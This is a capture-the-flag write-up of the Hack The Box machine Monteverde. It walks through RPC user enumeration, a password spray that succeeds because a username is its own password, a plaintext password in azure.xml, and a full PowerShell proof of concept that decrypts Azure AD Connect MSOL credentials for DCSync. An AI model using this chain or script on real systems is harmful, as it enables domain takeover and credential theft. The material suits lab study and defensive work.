---
title: Monteverde
date: 2026-08-21
description: Medium Windows AD box spraying users for SABatchJobs, pulling mhope's password from azure.xml in the users share, and decrypting Azure AD Connect credentials for a DCSync-capable MSOL account.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Aug 21 15:40:01 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49677,49678,49680,49700,49754 -A -oN scan_results.txt 10.129.228.111
Nmap scan report for monteverde.htb (10.129.228.111)
Host is up (0.60s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-21 19:46:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6m04s
| smb2-time: 
|   date: 2026-08-21T19:47:48
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   804.71 ms 10.10.16.1
2   290.86 ms monteverde.htb (10.129.228.111)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 21 15:42:48 2026 -- 1 IP address (1 host up) scanned in 166.64 seconds
```

- Rcp - anonymous bind
- ldap - anonymous bind

```sh
rpcclient -N -U "" 10.129.228.111

rpcclient $> netshareenumall
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

rpcclient $> enumdomusers

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

```txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

- Got usernames (couldn't run nxc due to timeout errors extracting information)

```powershell
rpcclient $> queryuser AAD_987d7f2f57d2
	User Name   :	AAD_987d7f2f57d2
	Full Name   :	AAD_987d7f2f57d2
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Fri, 21 Aug 2026 10:19:43 EDT
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Thu, 02 Jan 2020 17:53:25 EST
	Password can change Time :	Fri, 03 Jan 2020 17:53:25 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x450
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000000c
	padding1[0..7]...
	logon_hrs[0..21]...

```

We found the Service account for the **Synchronization service**

The above can also be done with `enum4linux`:

```sh
enum4linux -a 10.129.228.111
```

Here we noticed **Account Lockout Threshold : None**

# User

- Password spraying with `nxc`:
	- Can be done on both smb and ldap

```sh
nxc smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce

SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

Used creds to view the shares but nxc failed due to connection time error:

- So we used `smbmap` for listing directories:

```sh
smbmap -u 'SABatchJobs' -p 'SABatchJobs' -H 10.129.228.111
```

- The `user$` share seems interesting:

```sh
smbclient //10.129.228.111/users$ -U SABatchJobs

smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

```sh
tree users\$

users$
├── dgalanos
├── mhope
│   └── azure.xml
├── roleary
└── smorgan

5 directories, 1 file

```

```sh
xmllint -format /root/monteverde/users$/mhope/azure.xml
```

```html
<Objs Version="1.1.0.1">
<Obj RefId="0">
<TN RefId="0">
<T>
Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential
</T>
<T>System.Object</T>
</TN>
<ToString>
Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential
</ToString>
<Props>
<DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
<DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
<G N="KeyId">00000000-0000-0000-0000-000000000000</G>
<S N="Password">4n0therD4y@n0th3r$</S>
</Props>
</Obj>
</Objs>
```

- The **mhope** user directory holds a file which revealed the plaintext password:

> `mhope - 4n0therD4y@n0th3r$`

Gained shell using Evil-WinRM

# Root

Navigating to C:\Program Files\ we can see that both Microsoft SQL Server and AD Connect are installed.
There are many articles published online regarding vulnerabilities and privilege escalation opportunities with the **Azure AD (AAD) Sync** service.

> https://app.opencve.io/cve/?vendor=microsoft&product=azure_active_directory_connect

According to Microsoft documentation, the ADSync service is responsible for synchronizing your Local AD with Azure AD.

> reference :
> https://learn.microsoft.com/en-us/answers/questions/2201891/microsoft-azure-ad-sync-service-not-showing-in-ser

- We can enumerate the service instance using the Registry:

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

This reveals the service binary is `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`.

Issue the command below to obtain the **file (and product) version**:

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```

```powershell
ProductVersion : 1.1.882.0
```


### New Version

- Searching online reveals the **adconnectdump tool**, which can extract the password for the **AD Connect Sync Account**:

> link : https://github.com/dirkjanm/adconnectdump

- The repo mentions that the way AD connect stores credentials changed a while back.

- The new version stores credentials using DPAPI and the old version used the Registry.
- The current version of AD Connect at the time of writing is 1.5.30.0, so the version on the server is unlikely to use DPAPI.
- This tool works for newer versions of AD Connect that use DPAPI.

### Older version

> Link : https://blog.xpnsec.com/azuread-connect-for-redteam/

Some further searching reveals this blog post, which is recommended reading. It details the exploitation process for the older version of AD Connect. Copy the script from the blog post and save it locally.

---
`# blog content`
1st -> The most interesting is **Password Hash Synchronisation** (PHS), which uploads user accounts and password hashes from Active Directory into Azure.

2nd -> **Pass-through Authentication** (PTA) which allows Azure to forward authentication requests onto on-prem AD rather than relying on uploading hashes.

3rd -> **Federated Authentication**, the traditional ADFS deployment we have seen numerous times.

> The attacks possible if an attacker is able to reach a server running Azure AD Connect.

> Azure AD Connect is the service installed within the Active Directory environment. It is responsible for syncing and communicating with Azure AD

`## PHS… smells like DCSync`

> Note: **dll files** are known as **assemblies**

- `Microsoft.Online.PasswordSynchronization.dll` -> responsible for handling the **synchronisation of password hashes**

- This assembly can be found within the default installation path of Azure AD Sync `C:\Program Files\Microsoft Azure AD Sync\Bin`.

**DRS** (Directory Replication Services) prefixes a number of API's which facilitate the **replication of objects** between domain controllers.

 > DRS is also used by another of our favourite tools to recover password hashes… [Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/modules/rpc/kull_m_rpc_drsr.c).


So what we're actually seeing is how Azure AD Connect **retrieve data** from Active Directory to **forward it** onto **Azure** AD.

> Well as we know, **to perform a DCSync via Mimikatz**, an account must possess the "Replicating Directory Changes" **permission** within AD.

We can see that a new user is created during the installation of Azure AD Connect with the username `MSOL_[HEX]`
- reviewing its permissions, we see what we'd expect of an account tasked with **replicating AD**


By default when deploying the connector a new database is created on the host using SQL Server's LOCALDB.

To view information on the running instance, use the installed `SqlLocalDb.exe` tool.

- The database supports the Azure AD Sync service by storing metadata and configuration data for the service.

Table named `mms_management_agent` which contains a number of fields including `private_configuration_xml`.
- The XML within this field holds details regarding the `MSOL` user
- The password is omitted from the XML returned
- The encrypted password is actually stored within another field, `encrypted_configuration`

Looking through the handling of this encrypted data within the connector service:
- we see references to an assembly `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll`
- which is responsible for **key management** and the **decryption** of this data

To decrypt the `encrypted_configuration` value:
- a quick POC which retrieves the keying material from the LocalDB instance before passing it to the `mcrypt.dll` assembly to decrypt:

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

When executed, the decrypted password for the MSOL account is revealed.

Requirements:
To complete this exfiltration of credentials:
- Need access to the LocalDB (if configured to use this DB), which by default holds the following security configuration

This means that if you are able to compromise a server containing the **Azure AD Connect service**, and gain access to either the **ADSyncAdmins** or **local Administrators groups**, you have the ability to retrieve the credentials for an account capable of performing a DCSync.

--- 
Going through the content we understood how Azure AD Connect works.

Need to check whether the user is a member of any ADSync admins or local administrator group:

```powershell
net user mhope
```

---
#### Optional  

> Either fetch the keys manually and enter them in the variable fields of the POC, or leave it to the script (automates)

Three values to proceed with the attack:

```txt
- key_id
- instance_id
- entropy
```

- `sqlcmd` to fetch info from the **ADsync table** on the **MONTEVERDE server**:

```powershell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

---


Change the ArgumentList for the `$client` variable:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
```

> Like said earlier you can declare those variables manually or leave it to the script

Wrap the powershell script by providing it with a function name **Get-ADconnectPassword**

Final payload:

```powershell
Function Get-ADconnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```

```sh
evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$' -s .
```

- `-s` -> used to specify a **script directory path** that contains PowerShell scripts you want to **load** and use during the WinRM session.

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> adconnect.ps1
```

- execute the script and call the function:

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADconnectPassword
```

Gained `root`
